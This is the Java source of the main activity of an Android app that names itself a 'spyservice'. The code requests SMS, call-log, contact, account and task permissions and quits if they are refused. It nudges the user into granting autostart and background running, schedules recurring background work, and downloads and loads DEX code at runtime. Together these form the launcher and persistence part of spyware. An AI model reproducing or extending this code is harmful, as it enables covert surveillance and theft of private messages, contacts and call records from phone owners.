/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkInfo;
import androidx.work.WorkManager;

import com.judemanutd.autostarter.AutoStartPermissionHelper;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;

import ru.er_log.spyservice.loadable.DexLoader;
import ru.er_log.spyservice.network.DownloadManager;
import ru.er_log.spyservice.util.ChinesePermissionUtils;
import ru.er_log.spyservice.util.CommonUtils;

public class MainActivity extends AppCompatActivity
{
    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkPermissions();
        new StatusUpdater().execute(this);

        TextView id = this.findViewById(R.id.textviewUniqueId);
        id.setText(CommonUtils.getUniqueAppInstallationId(this));
    }

    private static class LocalDEXTask extends AsyncTask<Context, Void, Void>
    {
        @Override
        protected Void doInBackground(Context... contexts)
        {
            DownloadManager downloadManager = new DownloadManager();
            DexLoader dexLoader = new DexLoader(contexts[0], downloadManager);
            Worker.doWork(dexLoader);
            return null;
        }
    }

    private void blockAllUIComponents(boolean really)
    {
        findViewById(R.id.buttonClient).setEnabled(!really);
        findViewById(R.id.buttonServer).setEnabled(!really);
    }

    /** Especially for devices with a shell (not raw Android). */
    private void checkManufacturerPermissions()
    {
        blockAllUIComponents(true);

        Toast.makeText(this, "Hi. Please, check the following in next setting windows:", Toast.LENGTH_LONG).show();
        Toast.makeText(this, " -> enable autostart for this app", Toast.LENGTH_LONG).show();
        Toast.makeText(this, " -> allow app running in background", Toast.LENGTH_LONG).show();

        Handler handler = new Handler();
        handler.postDelayed(() ->
        {
            if (AutoStartPermissionHelper.getInstance().isAutoStartPermissionAvailable(this))
            {
//                Toast.makeText(this, "Please, enable autostart for this app", Toast.LENGTH_LONG).show();
                AutoStartPermissionHelper.getInstance().getAutoStartPermission(this);
            }

            ChinesePermissionUtils.goToSetting(this);
            blockAllUIComponents(false);
        }, 10600);
    }

    private void checkPermissions()
    {
        String[] permissions =
                {
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.INTERNET,

                        Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.GET_TASKS,
                        Manifest.permission.GET_ACCOUNTS
                };

        List<String> request = new ArrayList<>();
        for (String permission : permissions)
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED)
                request.add(permission);

        if (!request.isEmpty())
            ActivityCompat.requestPermissions(this, request.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults)
    {
        for (int i = 0; i < grantResults.length; i++)
            if (grantResults[i] == PackageManager.PERMISSION_DENIED)
            {
                Log.e(Settings.LOG_TAG, "Finishing... Permission not granted: " + permissions[i]);
                finish();
                return;
            }

        if (isFirstLaunch(this))
            checkManufacturerPermissions();
    }

    public void clickStartService(View view)
    {
        if (!Settings.RUN_IN_BACKGROUND)
        {
            new LocalDEXTask().execute(this);
            return;
        }

        Constraints constrains = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.NOT_ROAMING)
                .setRequiresDeviceIdle(Settings.REQUIRES_IDLE)
                .build();

        PeriodicWorkRequest.Builder builder = new PeriodicWorkRequest.Builder(Worker.class, Settings.REPEAT_INTERVAL, Settings.REPEAT_TIME_UNIT, Settings.FLEX_INTERVAL, Settings.FLEX_TIME_UNIT)
                .addTag(Settings.TASK_TAG)
                .setInitialDelay(Settings.INITIAL_DELAY, Settings.INITIAL_TIME_UNIT)
                .setConstraints(constrains);

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(Settings.TASK_TAG, ExistingPeriodicWorkPolicy.KEEP, builder.build());

        Toast.makeText(this, "Ok, task planned", Toast.LENGTH_SHORT).show();
        new StatusUpdater().execute(this);
    }

    public void clickStopService(View view)
    {
        WorkManager.getInstance(this).cancelAllWorkByTag(Settings.TASK_TAG);

        Toast.makeText(this, "Ok, task canceled", Toast.LENGTH_SHORT).show();
        new StatusUpdater().execute(this);
    }

    private static class StatusUpdater extends AsyncTask<MainActivity, Void, Void>
    {
        @SuppressLint("SetTextI18n")
        @Override
        protected Void doInBackground(MainActivity... activities)
        {
            try
            {
                List<WorkInfo> list = WorkManager.getInstance(activities[0]).getWorkInfosForUniqueWork(Settings.TASK_TAG).get();

                int failedRunAttempts = 0;
                int totalRunAttempts = 0;
                int queuedCount = 0;

                boolean planned = false;
                for (WorkInfo info : list)
                {
                    WorkInfo.State state = info.getState();

                    if (state.compareTo(WorkInfo.State.FAILED) == 0 || state.compareTo(WorkInfo.State.CANCELLED) == 0)
                        failedRunAttempts++;
                    else if (state.compareTo(WorkInfo.State.RUNNING) <= 0)
                        queuedCount++;

                    if (!state.isFinished())
                        planned = true;
                    else
                        totalRunAttempts++;
                }

                String statsFailed = failedRunAttempts + " of " + totalRunAttempts;
                String statsQueued = queuedCount + "";
                final boolean _planned = planned;
                activities[0].runOnUiThread(() ->
                {
                    TextView textviewStatus = activities[0].findViewById(R.id.textviewStatus);
                    TextView textviewStatusTotal = activities[0].findViewById(R.id.textviewStatusTotal);
                    TextView textviewStatusQueued = activities[0].findViewById(R.id.textviewStatusQueued);

                    if (list.isEmpty() || !_planned)
                    {
                        textviewStatus.setTextColor(Color.LTGRAY);
                        textviewStatus.setText("Service status: stopped");

                        textviewStatusTotal.setText("");
                        textviewStatusQueued.setText("");
                    } else
                    {
                        textviewStatus.setTextColor(0xFF00AD34);
                        textviewStatus.setText("Service status: active");

                        textviewStatusTotal.setTextColor(Color.LTGRAY);
                        textviewStatusTotal.setText(" >  failed works: " + statsFailed.toLowerCase());

                        textviewStatusQueued.setTextColor(Color.LTGRAY);
                        textviewStatusQueued.setText(" >  works queued or running: " + statsQueued);
                    }
                });

                return null;
            } catch (ExecutionException | InterruptedException e)
            {
                Log.d(Settings.TASK_TAG, "Can't get task status: " + e.getMessage());
                e.printStackTrace();
            }

            return null;
        }
    }

    public static boolean isFirstLaunch(Context context)
    {
        File file = new File(context.getApplicationInfo().dataDir + File.separator + "launch.tag");
        if (file.isFile())
            return false;

        File parent = file.getParentFile();
        if (parent != null) parent.mkdirs();
        try { file.createNewFile(); }
        catch (IOException e)
        {
            Log.e(Settings.LOG_TAG, "Failed to fix first application launch: " + e.getMessage());
            e.printStackTrace();
        }
        return true;
    }
}
